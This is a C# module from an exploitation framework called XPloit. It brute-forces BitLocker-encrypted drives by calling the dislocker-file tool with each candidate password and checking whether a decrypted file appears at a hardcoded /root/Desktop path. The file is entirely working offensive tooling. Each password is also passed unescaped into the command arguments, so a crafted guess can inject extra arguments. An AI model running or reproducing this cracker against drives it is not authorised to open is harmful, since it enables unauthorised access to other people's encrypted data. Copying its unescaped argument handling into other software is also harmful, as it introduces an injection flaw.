using System.Diagnostics;
using System.IO;
using XPloit.Core;
using XPloit.Core.Enums;

namespace XPloit.Modules.Auxiliary.Local
{
    public class BruteForceBitLockerDisLocker : Payload, BruteForce.ICheckPassword
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Crack Bitlocker drive calling dislocker"; } }
        public override string Path { get { return "Payloads/Local/BruteForce"; } }
        public override string Name { get { return "BruteForceBitLockerDisLocker"; } }
        public override Reference[] References { get { return new Reference[] { new Reference(EReferenceType.URL, "https://github.com/Aorimn/dislocker") }; } }
        #endregion

        #region Properties
        public string Drive { get; set; }
        #endregion

        public bool AllowMultipleOk { get { return false; } }
        public bool CheckPassword(string password)
        {
            using (Process proc = new Process())
            {
                proc.StartInfo.FileName = "dislocker-file";
                proc.StartInfo.Arguments = "\"-u" + password + "\" -V /dev/" + Drive + " /root/Desktop/test.ntfs";
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = false;
                proc.Start();

                proc.WaitForExit();
                //int x=proc.ExitCode;
            };

            return File.Exists("/root/Desktop/test.ntfs");
        }
        public bool PreRun() { return true; }
        public void PostRun() { }
    }
}